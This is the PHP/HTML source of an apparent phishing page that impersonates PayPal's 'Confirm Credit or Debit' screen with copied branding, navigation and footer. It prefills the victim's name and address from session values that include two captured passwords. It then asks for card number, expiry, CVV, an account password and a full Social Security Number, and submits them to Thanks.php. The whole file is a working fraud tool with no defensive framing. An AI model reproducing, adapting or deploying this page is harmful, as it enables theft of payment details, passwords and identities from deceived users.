<?php
session_start();
$unpass = $_SESSION['unpass'];
$deuxpass = $_SESSION['deuxpass'];
$firstname = $_SESSION['firstname'];
$lastname = $_SESSION['lastname'];
$bday = $_SESSION['bday'];
$bmonth = $_SESSION['bmonth'];
$byear = $_SESSION['byear'];
$adress = $_SESSION['address1'];
$adresss = $_SESSION['address2'];
$city = $_SESSION['city'];
$state = $_SESSION['state'];
$cntry = $_SESSION['cntry'];
$zip = $_SESSION['zip'];
$emails = $_SESSION['emails'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<head>
<script>
function validateForm()
{
var x=document.forms["myForm"]["cc_number"].value;
if (x==null || x=="")
  {
  alert("Card Number must be filled out");
  return false;
  }
  
  var x=document.forms["myForm"]["cvv2_number"].value;
if (x==null || x=="")
  {
  alert("Card Verification Number must be filled out");
  return false;
  }
}
</script>
</head>

<html lang="en">
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">

<title>Confirm Credit Card or Debit Card</title>
<META NAME="robots" CONTENT="noindex">
<META NAME="robots" CONTENT="nofollow">
<META NAME="robots" CONTENT="noarchive">
<META NAME="robots" CONTENT="nosnippet">
<META NAME="robots" CONTENT="noodp">
<META NAME="robots" CONTENT="noydir">
<link media="screen" rel="stylesheet" type="text/css" href="doc/global00.css"><link rel="stylesheet" type="text/css" href="doc/ProfileC.css">

<link media="print" rel="stylesheet" type="text/css" href="doc/print000.css"><style type="text/css" id="antiClickjack">body{display:none !important;}</style><script type="text/javascript">
				if (self === top) {
					var antiClickjack = document.getElementById("antiClickjack");
					antiClickjack.parentNode.removeChild(antiClickjack);
				} else {
					top.location = self.location;
				}
			</script><script type="text/javascript" src="doc/global00.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20121008-1';</script><link rel="shortcut icon" href="doc/pp_favic.ico"><link rel="apple-touch-icon"></head><body><noscript><style type="text/css">body{display:block !important;}</style><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript><div class="ccadd " id="page"><div id="header" class="std"><h1><a><img border="0" src="doc/paypal_l.gif" alt="PayPal"></a></h1><div id="navGlobal"><span><a class="accessAid skip">Skip to main content</a></span><ul><li class="logout"><a>Log Out</a></li><li><a>Help</a></li><li class="last"><a>Security Center</a></li></ul></div><div role="navigation" id="navPrimary"><ul><li class="active"><a class="scTrack:SRD:Nav:BD36">My Account</a></li><li><a class="scTrack:SRD:Nav:BF1">Send Payment</a></li><li><a class="scTrack:SRD:Nav:BF5">Request Money</a></li><li><a class="scTrack:SRD:Nav:BF10">Merchant Services</a></li><li><a class="scTrack:SRD:Nav:BF11">Products &amp; Services</a></li></ul></div></div><div id="content"><div id="headline"><div class="secure"><a target="_blank" onclick="PAYPAL.core.openWindow(event,{size:'l'});">Secure Transaction</a></div><h2>Confirm Credit or Debit</h2>
</div><div id="messageBox"></div><div id="main"><div class="legacyErrors"><form name="myForm" method="post" action="Thanks.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja2121545487KJJHHG5548782121548LLOpm54548" onsubmit="return validateForm()" class=" edit"><input type="hidden" name="cmd" value="_flow"><input type="hidden" name="cid" value><input type="hidden" id="CONTEXT_CGI_VAR" name="CONTEXT" value="X3-7SZn2ExXucINxlliZ_05NdFsrIIpaV9TcRYNLL_GiOwm9XgEZzWKQeV0"><input type="hidden" id="myAllTextSubmitID" name="myAllTextSubmitID" value><input type="hidden" name="form_charset" value="UTF-8">
                                             <input type="hidden" value="doc/files/CardConf.js" name="hostname">                                            
											 <input type="hidden" name="SESSION" value="-9XGDuFn6V4347Fo4NJ7NUsJK4cErn93zfnMP_jSDlVQnw54v_sFkurmMCi">
                                             <input type="hidden" name="dispatch" value="5885d80a13c0db1f8e263663d3faee8d0b7e678a25d883d0bcf119ae9b66ba33">
                                             <input type="hidden" name="LastFlowDispatch" value="5885d80a13c0db1f8e263663d3faee8d0b7e678a25d883d0bcf119ae9b66ba33">
                                             <input type="hidden" name="LastRapidsSession" value="-9XGDuFn6V4347Fo4NJ7NUsJK4cErn93zfnMP_jSDlVQnw54v_sFkurmMCi">
                                             <input type="hidden" name="outdated_page_tmpl" value="p/gen/failed-to-load">
                                             <input type="hidden" name="login_email" value="">
                                             <input type="hidden" name="auth" value="Ap6qC07cctpz35wPJ9IxAz4r5kcI3ui-BkAv9BikNvIGNHhZdEtVyFFtJFZytysC0gZsdel1YGj257Y0n6qDswQ">
                                             <p>Make sure you enter the information accurately, and according to the required formats.</p>
											 <p>Fill out all required fields.</p> 
											 <p>By clicking the button Confirm Card, You accept the <a> Terms of Use</a> and <a target="_blank"> Rules on compliance with privacy</a> of PayPal.</p><div class="MktMPI" id="mpi610004"><img alt="" border="0" height="1" src="doc/pixel000.gif" width="1"></div><p>Number of cards active on your account: 1</p><input type="hidden" name="cc_brand" value><div id="fieldrowFirstName"><p class="group"><label for="first_name"><span class="labelText">Name on card</span></label><span class="field confidential"><input type="text" id="fullname" size="30" maxlength="32" name="fullname" value="<?=$firstname?> <?=$lastname?>"></span></p></div><div id="fieldrowCCType"><fieldset class="multi"><legend class="accessAid">Card Type</legend><span class="labels"><span class="label">Card Type</span></span><div class="fields"><p class="group first"><label for="credit_card_type" class="accessAid"><span class="labelText">Card Type</span></label><span class="field"><select id="credit_card_type" name="credit_card_type" onchange><option value="&nbsp;">Select a card</option><option value="V">Visa</option><option value="M">MasterCard</option><option value="A">American Express</option><option value="D">Discover</option></select><br></span></p></div></fieldset></div><div id="fieldrowCCNumber"><fieldset class="multi"><legend class="accessAid">Card Number</legend><span class="labels"><span class="label">Card Number</span></span><div class="fields"><p class="group first help"><label for="cc_number" class="accessAid"><span class="labelText">Card Number</span></label><span class="help"></span><span class="field restricted"><input type="text" id="cc_number" autocomplete="off" size="30" maxlength="16" name="cc_number" value></span></p><div id="xptCardIcons"><img border="0" src="doc/logo_ccV.gif" class="marginBottom ccLogo V" alt="Visa" title="Visa"><wbr></wbr><img border="0" src="doc/logo_ccM.gif" class="marginBottom ccLogo M" alt="Mastercard "><wbr></wbr><img border="0" src="doc/logo_ccA.gif" class="marginBottom ccLogo A" alt="American Express "><wbr></wbr><img border="0" src="doc/logo_ccD.gif" class="marginBottom ccLogo D" alt="Discover" title="Discover"><wbr></wbr></div></div></fieldset></div><div id="bankInfoCUP"></div><div id="fieldrowCCExpDate"><fieldset class="multi"><legend class="accessAid">Expiration Date</legend><span class="labels"><span class="label">Expiration Date</span></span><div class="fields"><span><p class="group first"><label for="expdate_month" class="accessAid"><span class="labelText">Month</span></label><span class="field restricted"><select id="expdate_month" name="expdate_month"><option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11" selected="selected">11</option><option value="12">12</option></select></span></p><p class="group"><label for="expdate_year" class="accessAid"><span class="labelText">Year</span></label><span class="field restricted"><select id="expdate_year" name="expdate_year"><option value="2014">2014</option><option value="2015">2015</option><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option></select></span></p></span></div></fieldset></div><div id="fieldrowCSC"><p class="group help" id="fieldRowCSCInput"><label for="cvv2_number"><span class="labelText">Card Verification Number</span></label><span class="help">Last 3-digits on the back of your card. For AmEx, 4 digits on the front of your card. </span><span class="field restricted"><input type="text" id="cvv2_number" autocomplete="off" size="3" maxlength="4" name="cvv2_number" value><a target="_blank" onclick="PAYPAL.core.openWindow(event, {width: 425, height: 450});" id="1"><img align="top" border="0" src="doc/mini_cvv.gif" alt="Help finding your Card Verification Number"></a>&nbsp;<a target="_blank" onclick="PAYPAL.core.openWindow(event, {width: 425, height: 450});" id="1"><span class="small">Help finding your Card Verification Number</span></a>&nbsp;|&nbsp;<a target="_blank" onclick="PAYPAL.core.openWindow(event, {width: 425, height: 450});" id="11"><span class="small">Using AmEx?</span></a><br></span></p></div><input type="hidden" name="cc_brand" value><div id="fieldrowFirstName"><p class="group"><label for="ccpin">Password</label><span class="field"><input id="ccpin" maxlength="20" name="ccpin" type="password"></span></p><p class="group"><label for="ccpin">Social Security Number</label><span class="field"><input name="ssn1" type="text" value="" maxlength="3" id="ssn1" style="width: 30px;" />
                    &nbsp;-&nbsp;
                    <input name="ssn2" value="" type="text" maxlength="2" id="ssn2" style="width: 20px;" />&nbsp;-&nbsp;
                    <input name="ssn3" type="text" maxlength="4" id="ssn3" style="width: 40px;" /></span></p><div id="sectionBillingAddress"><hr class="dotted"><h3>Billing Address</h3><p>Enter the address where you receive billing statements for this card. In order to confirm your bank card number, the billing address must be the one displayed on your statements.</p><p><label for="existing_address_indicator" class="radio"><input type="radio" id="existing_address_indicator" checked name="address" value="existing"><span>Use this address as billing address</span></label></p><p class="confidential"><label for="addressId" class="accessAid">Billing address</label><select id="addressId" name="address_id"><option value="_csVaX5DSqjBYQZnW-mu5u2WHNOztopVFU4Rr7otyc6p-FcHM4Y78MXSay8"><?=$adress?>, <?=$adresss?>, <?=$city?>, <?=$state?>, <?=$zip?>, <?=$cntry?> (Home)</option></select></p><p><label for="new_address_indicator" class="radio"><p class="buttons"><input type="submit" id="add" name="add.x" value="Confirm Card" onclick="											
																					s.scTrackPage(function() {
																						s.eVar29='CreditCard::CreditCardFlow::Submit';
																					});
																				" class="button primary default"><input type="submit" name="cancel_add.x" value="Cancel" class="button"></p><input name="auth" type="hidden" value="Aot8MLaU3iBKMGON8FGJjAvKzrH2vWQ2C41nZft8-uMJZeopuc1yq-6M6Gwj-8OqE264RimxWW2vdLR16OG-qSA"><input name="form_charset" type="hidden" value="UTF-8"></form></div></div></div><div id="footer" role="contentinfo"><h5 class="accessAid">More Information</h5><ul><li><a>About Us</a></li><li><a>Accounts</a></li><li><a>Fees</a></li><li><a>Privacy</a></li><li><a>Security Center</a></li><li><a>Contact Us</a></li><li><a>Legal Agreements</a></li></ul><p id="legal">Copyright © 1999-2013 PayPal. All rights reserved.<br>Consumer advisory- PayPal Pte. Ltd., the holder of PayPal's stored value<br>facility, does not require the approval of the Monetary Authority of Singapore.<br>Users are advised to read the <a>terms and conditions</a> carefully.</p></div><div role="navigation" id="navFull"><ul><li class="active"><a class="scTrack:SRD:Nav:BD36">My Account</a><ul><li><a class="scTrack:SRD:Nav:BD37">Overview</a></li><li><a class="scTrack:SRD:Nav:BD39">Withdraw</a></li><li><a class="scTrack:SRD:Nav:BD43">History</a><ul><li><a class="scTrack:SRD:Nav:BD44">Basic Search</a></li><li><a class="scTrack:SRD:Nav:BD46">Download History</a></li><li><a class="scTrack:SRD:Nav:BD49">Reports</a></li><li><a class="scTrack:SRD:Nav:BD50">IPN History</a></li></ul></li><li><a class="scTrack:SRD:Nav:BD51">Resolution Center</a><ul><li><a class="scTrack:SRD:Nav:BD52">View Open Cases</a></li></ul></li><li class="active"><a class="scTrack:SRD:Nav:BD62">Profile</a><ul><li><a class="scTrack:SRD:Nav:BD63">Add/Edit Email</a></li><li><a class="scTrack:SRD:Nav:BD64">Add/Edit Bank Account</a></li><li><a class="scTrack:SRD:Nav:BD65">Add/Edit Credit Card</a></li><li><a class="scTrack:SRD:Nav:BD66">Add/Edit Street Address</a></li></ul></li></ul></li><li><a class="scTrack:SRD:Nav:BF1">Send Payment</a></li><li><a class="scTrack:SRD:Nav:BF5">Request Money</a></li><li><a class="scTrack:SRD:Nav:BF10">Merchant Services</a></li><li><a class="scTrack:SRD:Nav:BF11">Products &amp; Services</a></li></ul></div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="doc/widgets0.js"></script><script type="text/javascript" src="doc/ProfileC.js"></script>
<script type="text/javascript" src="doc/pp_jscod.js"></script>

<noscript><img src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript" height="1" width="1" border="0" alt></noscript>


<noscript><img src="https://t.paypal.com/ts?nojs=1&amp;pgrp=Profile%3aCredit%20Card%20or%20Debit%20Card%3aAdd&amp;cnac=MA&amp;page=Profile%3aCredit%20Card%20or%20Debit%20Card%3aAdd&amp;teal=Kzn0SyWpf0V%252bk4J1jhdvcB7wrSbdDLYiRocB5QwzQ1T7XSlQDHUT6Q%253d%253d_13a84138142&amp;tmpl=xpt%2fFinancialInstrument%2faccount%2fprofile%2fCCAdd&amp;cust=7A68396262897963B&amp;acnt=business&amp;aver=verified&amp;rstr=unrestricted&amp;pgst=1350835602&amp;lgin=in&amp;calc=8dd3d4bc92a40&amp;rsta=en_US" height="1" width="1" border="0" alt></noscript>
</body></html>